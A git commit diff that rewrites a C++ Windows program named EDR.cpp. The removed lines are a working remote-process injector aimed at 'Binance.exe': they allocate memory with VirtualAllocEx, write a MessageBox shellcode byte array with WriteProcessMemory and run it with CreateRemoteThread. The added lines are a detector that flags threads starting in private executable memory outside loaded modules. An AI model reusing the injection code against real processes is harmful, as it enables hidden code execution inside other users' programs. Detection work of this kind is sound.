0cb648b4844cc3cd4c9e5d4ce6b215968adf7ea4
godwinjose <godwinthattla@gmail.com>
2026-03-17 22:24:14 +0530

    Updated EDR.cpp logic

--- src/EDR.cpp
+++ src/EDR.cpp
@@ -1,149 +1,215 @@
 #include <windows.h>
-#include <iostream>
-#include<vector>
-#include <cstdint>
-
 #include <tlhelp32.h>
+#include <iostream>
+#include <vector>
+#include <unordered_map>
 
+typedef NTSTATUS (NTAPI *pNtQueryInformationThread)(
+    HANDLE,
+    ULONG,
+    PVOID,
+    ULONG,
+    PULONG
+);
 
-DWORD GetPIDByName(const std::wstring& processName) {
+struct ModuleInfo {
+    uintptr_t base;
+    uintptr_t end;
+    std::string name;
+};
+struct ThreadInfo {
+    DWORD tid;
+    uintptr_t startAddress;
+};
 
+//module enumeration.....
+std::vector<ModuleInfo> GetModules(DWORD pid) {
 
-    PROCESSENTRY32W pe;
-    pe.dwSize = sizeof(PROCESSENTRY32W);
+    std::vector<ModuleInfo> modules;
 
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snapshot == INVALID_HANDLE_VALUE) {
-        std::cout << "Snapshot failed\n";
-        return 0;
-    }
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
+    if (snapshot == INVALID_HANDLE_VALUE)
+        return modules;
 
-    if (Process32FirstW(snapshot, &pe)) {
+    MODULEENTRY32 me;
+    me.dwSize = sizeof(me);
+
+    if (Module32First(snapshot, &me)) {
         do {
-            if (!_wcsicmp(pe.szExeFile, processName.c_str())) {
-                CloseHandle(snapshot);
-                return pe.th32ProcessID;
-            }
-        } while (Process32NextW(snapshot, &pe));
+            uintptr_t base = (uintptr_t)me.modBaseAddr;
+            uintptr_t end  = base + me.modBaseSize;
+
+            modules.push_back({
+                base,
+                end,
+                me.szModule
+            });
+
+        } while (Module32Next(snapshot, &me));
     }
 
     CloseHandle(snapshot);
-    return 0;
+    return modules;
+}
+bool IsAddressInModule(uintptr_t addr, const std::vector<ModuleInfo>& modules) {
+
+    for (const auto& m : modules) {
+        if (addr >= m.base && addr < m.end) {
+            return true;
+        }
+    }
+
+    return false;
+}
+// ---------------- THREAD ENUMERATION ----------------
+std::vector<ThreadInfo> GetThreads(DWORD pid, pNtQueryInformationThread NtQueryInformationThread) {
+    std::vector<ThreadInfo> threads;
+
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (snapshot == INVALID_HANDLE_VALUE)
+        return threads;
+
+    THREADENTRY32 te;
+    te.dwSize = sizeof(te);
+
+    if (Thread32First(snapshot, &te)) {
+        do {
+            if (te.th32OwnerProcessID == pid) {
+                HANDLE hThread = OpenThread(
+                    THREAD_QUERY_INFORMATION | THREAD_QUERY_LIMITED_INFORMATION,
+                    FALSE,
+                    te.th32ThreadID
+                );
+
+                if (hThread) {
+                    PVOID startAddress = 0;
+
+                    if (NtQueryInformationThread(
+                            hThread,
+                            9,
+                            &startAddress,
+                            sizeof(startAddress),
+                            NULL
+                        ) == 0) {
+
+                        threads.push_back({
+                            te.th32ThreadID,
+                            (uintptr_t)startAddress
+                        });
+                    }
+
+                    CloseHandle(hThread);
+                }
+            }
+        } while (Thread32Next(snapshot, &te));
+    }
+
+    CloseHandle(snapshot);
+    return threads;
 }
 
-int main() {
+// ---------------- MEMORY SCAN ----------------
+void ScanProcess(DWORD pid, pNtQueryInformationThread NtQueryInformationThread) {
 
-    std::wstring target = L"Binance.exe";
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    if (!hProcess)
+        return;
 
-    DWORD pid = GetPIDByName(target);
+    std::vector<ThreadInfo> threads = GetThreads(pid, NtQueryInformationThread);
+    std::vector<ModuleInfo> modules = GetModules(pid);
 
-    if (pid == 0) {
-        std::cout << "Process not found\n";
-    }
-    else {
-        std::cout << "PID of " << "notepad.exe"
-                  << " is: " << pid << std::endl;
-    }
-    STARTUPINFOW si = {0};
-    PROCESS_INFORMATION pi = {0};
+    MEMORY_BASIC_INFORMATION mbi;
+    unsigned char* address = 0;
 
-    HANDLE hProcess = OpenProcess(
-    PROCESS_QUERY_INFORMATION |
-    PROCESS_VM_READ |
-    PROCESS_VM_WRITE |
-    PROCESS_VM_OPERATION,
-    FALSE,
-    pid
-);
+    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
 
-        std::cout << "Process Opened" << std::endl;
+        DWORD protect = mbi.Protect;
 
-    std::vector<uint8_t> ciphertext = {
- 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xcc,0x00,
-0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,
-0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
-0x20,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x8b,0x72,
-0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,
-0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,
-0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,0x78,
-0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80,0x88,
-0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x44,
-0x8b,0x40,0x20,0x50,0x8b,0x48,0x18,0x49,0x01,0xd0,0xe3,0x56,
-0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x4d,0x31,0xc9,0x48,0x01,
-0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
-0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,
-0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,
-0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,
-0x04,0x88,0x41,0x58,0x48,0x01,0xd0,0x41,0x58,0x5e,0x59,0x5a,
-0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,
-0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,
-0xff,0xff,0x5d,0xe8,0x0b,0x00,0x00,0x00,0x75,0x73,0x65,0x72,
-0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,0x59,0x41,0xba,0x4c,0x77,
-0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0xe8,
-0x0a,0x00,0x00,0x00,0x49,0x20,0x41,0x4d,0x20,0x48,0x45,0x52,
-0x45,0x00,0x5a,0xe8,0x0f,0x00,0x00,0x00,0x49,0x6e,0x6a,0x65,
-0x63,0x74,0x69,0x6f,0x6e,0x20,0x54,0x65,0x73,0x74,0x00,0x41,
-0x58,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,
-0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5};
+        bool isExecutable =
+            protect & PAGE_EXECUTE ||
+            protect & PAGE_EXECUTE_READ ||
+            protect & PAGE_EXECUTE_READWRITE ||
+            protect & PAGE_EXECUTE_WRITECOPY;
 
-        std::cout<<ciphertext.size();
+        if (mbi.State == MEM_COMMIT &&
+            mbi.Type == MEM_PRIVATE &&
+            isExecutable) {
 
+            uintptr_t base = (uintptr_t)mbi.BaseAddress;
+            uintptr_t end  = base + mbi.RegionSize;
 
-        LPVOID addr= VirtualAllocEx(
-                hProcess,
-                NULL,
-                ciphertext.size(),
-                MEM_COMMIT|MEM_RESERVE,
-                PAGE_READWRITE);
+            int count = 0;
 
-        if(!WriteProcessMemory(
-            hProcess,
-            addr,
-            ciphertext.data(),
-            ciphertext.size(),
-            NULL)){
-            std::cout<<"Memory Write Failed";
+            for (auto& t : threads) {
+                if (t.startAddress >= base && t.startAddress < end) {
+                    bool inModule = IsAddressInModule(t.startAddress, modules);
+
+                    if (!inModule) {
+                        count++;
+
+                        std::cout<< " executing OUTSIDE module (VERY SUSPICIOUS)\n";
+                        }
+                    std::cout << "[!] PID " << pid
+                              << " Thread " << t.tid
+                              << " executing in suspicious region\n";
+                }
+            }
+
+            if (count > 0) {
+                std::cout << "---- Suspicious Region ----\n";
+                std::cout << "PID: " << pid << "\n";
+                std::cout << "Base: " << mbi.BaseAddress << "\n";
+                std::cout << "Size: " << mbi.RegionSize << "\n";
+                std::cout << "Threads: " << count << "\n";
+                std::cout << "---------------------------\n";
+            }
         }
 
-    DWORD oldProtect;
+        address += mbi.RegionSize;
+    }
 
-    VirtualProtectEx(
-        hProcess,
-        addr,
-        ciphertext.size(),
-        PAGE_EXECUTE_READ,
-        &oldProtect
-);
-
-    HANDLE hThread = CreateRemoteThread(
-    hProcess,
-    NULL,
-    0,
-    (LPTHREAD_START_ROUTINE)addr,
-    NULL,
-    0,
-    NULL
-);
-
-
-if (!hThread) {
-    std::cout << "Remote thread creation failed";
+    CloseHandle(hProcess);
 }
 
+// ---------------- MAIN ----------------
+int main() {
 
-// WaitForSingleObject(hThread, INFINITE);
+    HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
+    if (!hNtDll) {
+        std::cout << "Failed to load ntdll\n";
+        return 1;
+    }
 
-// DWORD exitCode;
-// GetExitCodeThread(hThread, &exitCode);
+    pNtQueryInformationThread NtQueryInformationThread =
+        (pNtQueryInformationThread)GetProcAddress(hNtDll, "NtQueryInformationThread");
 
-// std::cout << "Shellcode returned: " << exitCode << std::endl;
+    if (!NtQueryInformationThread) {
+        std::cout << "Failed to resolve NtQueryInformationThread\n";
+        return 1;
+    }
 
-        // Resume normally
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot == INVALID_HANDLE_VALUE) {
+        std::cout << "Failed to create process snapshot\n";
+        return 1;
+    }
 
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(pe);
 
+    if (Process32First(snapshot, &pe)) {
+        do {
+            DWORD pid = pe.th32ProcessID;
 
-        CloseHandle(hProcess);
+            // Skip idle/system
+            if (pid == 0 || pid == 4)
+                continue;
 
+            ScanProcess(pid, NtQueryInformationThread);
 
+        } while (Process32Next(snapshot, &pe));
+    }
+
+    CloseHandle(snapshot);
     return 0;
 }
